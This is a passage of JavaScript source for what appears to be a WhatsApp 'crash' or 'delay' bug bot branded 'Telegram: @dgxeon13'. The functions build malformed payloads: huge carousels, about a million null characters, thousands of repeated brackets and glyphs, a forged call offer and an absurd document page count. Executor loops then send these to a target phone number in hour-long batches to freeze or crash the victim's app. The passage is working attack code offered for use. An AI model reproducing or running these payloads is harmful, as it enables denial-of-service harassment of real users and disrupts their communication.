          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIiQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
          scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
          scanLengths: [3537, 10557, 1905, 2353],
          midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo="
        }
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: []
      })
    });
  }

  let msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
            footer: proto.Message.InteractiveMessage.Footer.create({ text: "Telegram: @dgxeon13" }),
            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: [...push]
            })
          })
        }
      }
    },
    {}
  );

  await userSock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ 
          tag: "to", 
          attrs: { jid: target }, 
          content: undefined 
        }]
      }]
    }]
  });
  await new Promise(resolve => setTimeout(resolve, 5000));
    
    console.log(chalk.green(`Delaymaker sent to ${target}`));
  } catch (err) {
  console.error(`Error in Delaymaker for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
} 

async function xeonFloodExecutor(durationHours, target, userNumber, chatId, botInstance, ptcp) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonFlood(target, userNumber, chatId, botInstance, ptcp)
          ]);
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in delayking: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonMx(target, userNumber, chatId, botInstance, show = false) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

   let haxxn = 10;

for (let i = 0; i < haxxn; i++) {
let push = [];
let buttt = [];

for (let i = 0; i < 5; i++) {
buttt.push({
"name": "galaxy_message",
"buttonParamsJson": JSON.stringify({
"header": "null",
"body": "xxx",
"flow_action": "navigate",
"flow_action_payload": { screen: "FORM_SCREEN" },
"flow_cta": "Grattler",
"flow_id": "1169834181134583",
"flow_message_version": "3",
"flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
})
});
}

for (let i = 0; i < 1000; i++) {
push.push({
"body": {
 "text": " " 
},
"footer": {
"text": ""
},
"header": {
"title": ' ',
"hasMediaAttachment": true,
"imageMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/jpeg",
"fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
"fileLength": "591",
"height": 0,
"width": 0,
"mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
"fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
"directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
"mediaKeyTimestamp": "1721344123",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
"scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
"scanLengths": [
247,
201,
73,
63
],
"midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
}
},
"nativeFlowMessage": {
"buttons": []
}
});
}

const msg = generateWAMessageFromContent(target, {
"viewOnceMessage": {
"message": {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
"interactiveMessage": {
"body": {
"text": "\u0000\u0000\u0000\u0000"
},
"footer": {
"text": " "
},
"header": {
"hasMediaAttachment": false
},
"carouselMessage": {
"cards": [
...push
]
}
}
}
}
}, {});

await userSock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, {
participant: { jid: target }
});
}
    console.log(chalk.green(`visiblemax sent to ${target}`));
  } catch (err) {
  console.error(`Error in visiblemax for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function callXeon(target, userNumber, chatId, botInstance, show = false) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

let devices = (
await userSock.getUSyncDevices([target], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

await userSock.assertSessions(devices)

let xnxx = () => {
let map = {};
return {
mutex(key, fn) {
map[key] ??= { task: Promise.resolve() };
map[key].task = (async prev => {
try { await prev; } catch {}
return fn();
})(map[key].task);
return map[key].task;
}
};
};

let memek = xnxx();
let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let porno = userSock.createParticipantNodes.bind(userSock);
let yntkts = userSock.encodeWAMessage?.bind(userSock);

userSock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (userSock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let ywdh = Array.isArray(patched)
? patched
: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = userSock.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
let { user: targetUser } = jidDecode(jid);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

return memek.mutex(jid, async () => {
let { type, ciphertext } = await userSock.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
attrs: { jid },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

let awik = crypto.randomBytes(32);
let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
let { nodes: destinations, shouldIncludeDeviceIdentity } = await userSock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

let lemiting = {
tag: "call",
attrs: { to: target, id: userSock.generateMessageTag(), from: userSock.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": userSock.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{
tag: "video",
attrs: {
orientation: "0",
screen_width: "1920",
screen_height: "1080",
device_orientation: "0",
enc: "vp8",
dec: "vp8"
}
},
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(userSock.authState.creds.account, true)
}] : [])
]
}]
};

await userSock.sendNode(lemiting);
    console.log(chalk.green(`crashdroid sent to ${target}`));
  } catch (err) {
  console.error(`Error in crashdroid for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonUltraDelay(target, userNumber, chatId, botInstance, show = false) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

    const msg = {
viewOnceMessage: {
message: {
interactiveResponseMessage: {
body: {
text: "Telegram: @dgxeon13" + "ꦽ".repeat(696),
format: "EXTENSIONS_1",
},
nativeFlowResponseMessage: {
name: "galaxy_message",
paramsJson: `{"screen_2_OptIn_0":true,"screen_2_OptIn_1":true,"screen_1_Dropdown_0":"Telegram: @dgxeon13","screen_1_DatePicker_1":"1028995200000","screen_1_TextInput_2":"Telegram: @dgxeon13","screen_1_TextInput_3":"94643116","screen_0_TextInput_0":"#3izxvelzExerc1st. ‌${"\u0000".repeat(1045000)}","screen_0_TextInput_1":"INFINITE","screen_0_Dropdown_2":"001-Grimgar","screen_0_RadioButtonsGroup_3":"0_true","flow_token":"AQAAAAACS5FpgQ_cAAAAAE0QI3s."}`,
version: 3,
},
},
},
},
};

await userSock.relayMessage("status@broadcast", msg, {
messageId: Date.now().toString(),
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{ tag: "to", attrs: { jid: target }, content: [] }
]
}
]
}
]
});
    console.log(chalk.green(`Ultra Delay sent to ${target}`));
  } catch (err) {
  console.error(`Error in ultraDelay for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  await userBot.sendMessage(chatId, `❌ Error in ultraDelay: ${err.message}. Process stopped.`);
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonUiKing(target, userNumber, chatId, botInstance, show = false) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

    const msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: " Telegram: @dgxeon13",
hasMediaAttachment: false
},
body: {
text: "Telegram: @dgxeon13" + "ꦾ".repeat(19999)
},
nativeFlowMessage: {
messageParamsJson: "[{".repeat(10000),
messageParamsJson: "[{".repeat(10000),
messageParamsJson: "[{".repeat(10000),
buttons: [
{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: `${"𑲭𑲭".repeat(19999)}`,
sections: [
{
title: "Telegram: @dgxeon13",
rows: []
},
{
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
]
})
}
]
}
}
}
}
}, {});

await userSock.relayMessage(target, msg.message, {
messageId: msg.key.id,
participant: { jid: target }
});
    console.log(chalk.green(`Ui King sent to ${target}`));
  } catch (err) {
  console.error(`Error in uiking for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function restarti(target, userNumber, chatId, botInstance, mention = true) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

    const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
      ephemeralMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 3,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 99999999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "\u0007".repeat(30000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [],
            },
          },
        },
      },
    }), { userJid: target });

    await userSock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    if (mention) {
      await userSock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: msg.key,
                type: 25,
              },
            },
          },
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "Telegram: @dgxeon13" },
              content: undefined,
            },
          ],
        }
      );
    }
    console.log(chalk.green(`Delay medium sent to ${target}`));
  } catch (err) {
    console.error(err);
    throw err;
  }
}

async function xdelaynew(target, userNumber, chatId, botInstance, mention = true) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);
    
    const crashdoc = {
key: {
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: "0@s.whatsapp.net",
},
message: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/29212508_374854352198737_2889841909752059083_n.enc?ccb=11-4&oh=01_Q5AaIDB7jPhV8J-vkbbaYZYQtTzgrLTBx4DgorbqAFcdDoPl&oe=665973D2&_nc_sid=5e03e0&mms3=true",
mimetype: "text/plain",
fileSha256: "VigI621vLq45R4KIODq41owOti/0ZXSK+aLEZOl79H8=",
fileLength: "2143",
pageCount: 999999999999999,
mediaKey: "qStyFpDZOsxVCbR6oWfjM1AP6OKPloEYtoDVHeAEdxI=",
fileName: "types.bug",
fileEncSha256: "DOWZGa+9qihKxH1ZG0Fi0YhhSb1eZrFNM961Jlbzxdg=",
directPath: "/v/t62.7119-24/29212508_374854352198737_2889841909752059083_n.enc?ccb=11-4&oh=01_Q5AaIDB7jPhV8J-vkbbaYZYQtTzgrLTBx4DgorbqAFcdDoPl&oe=665973D2&_nc_sid=5e03e0",
mediaKeyTimestamp: "1714550098",
contactVcard: true,
}
},
}

    await userSock.sendMessage(target, {
        image: { url: "https://pic.re/image" },
        caption: '🤨? trava kkkkkkkk' + "𑐶".repeat(9999),
        mentions: [target],
        footer: "guto",
        buttons: [
          { buttonId: "hi", buttonText: { displayText: bug } },
          { buttonId: "hi2", buttonText: { displayText: bug } }
        ],
        viewOnce: true,
        headerType: 6,
        contextInfo: {
          externalAdReply: {
            title: 'ᴳᵘᵗᵒ 🌹',
            body: '',
            mediaType: 4,
            thumbnail: 'https://i.ibb.co/4ng6VsgM/Picsart-25-06-01-01-02-32-207.jpg',
            jpegThumbnail: 'https://i.ibb.co/4ng6VsgM/Picsart-25-06-01-01-02-32-207.jpg',
            mediaUrl: `https://www.youtube.com/@gutoxtazv9`,
            sourceUrl: `https://youtu.be/HBPPWoa9eeE?si=GKUGYD1KooQ9kVxx`
          }
        }
      }, { quoted: crashdoc });
    console.log(chalk.green(`Delay new sent to ${target}`));
  } catch (err) {
    console.error(err);
    throw err;
  }
}

async function xeonDelayMix(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000;    // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`Starting batch ${batch}...`));

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }

        let count = 0;
        const maxLoops = 25; // Total 25 calls

        while (count < maxLoops) {
          if (count % 2 === 0) {
            // Even index (0,2,4...): bulldozer
            await bulldozer(target, userNumber, chatId, botInstance);
            await sleep(1000);
            console.log(chalk.yellow(` ┌────────────────────────┐\n │ stressking... (${count + 1}/25)\n └────────────────────────┘ `));
          } else {
            // Odd index (1,3,5...): ultrayDelay
            await xeonUltraDelay(target, userNumber, chatId, botInstance);
            await sleep(1000);
            console.log(chalk.yellow(` ┌────────────────────────┐\n │ ultradelay... (${count + 1}/25)\n └────────────────────────┘ `));
          }
          count++;
        }

        // After 25 alternating calls
        console.log(chalk.bgYellow.black("25 calls done: stressking → ultradelay → ... (13 + 12), sleep 10s..."));
        await new Promise(resolve => setTimeout(resolve, 10000));

      } catch (error) {
        console.error(`Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        await userBot.sendMessage(chatId, `Error in delayking: ${error.message}. Process stopped.`);
        return;
      }
    }

    console.log(chalk.green(`Finished batch ${batch}`));
    batch++;

    if (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }

  console.log(chalk.cyan(`Done! Total batches sent: ${batch - 1}`));
}

async function XeonDelay1(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            bulldozer(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in delayking: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function callXeonExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            callXeon(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in delayking: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonMxExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonMx(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in delayking: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonUltraDelayExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonUltraDelay(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        await userBot.sendMessage(chatId, `❌ Error in ultra delay: ${error.message}. Process stopped.`);
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonUiKingExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonUiKing(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in uking: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonUiKingGpExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonUiKingGp(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
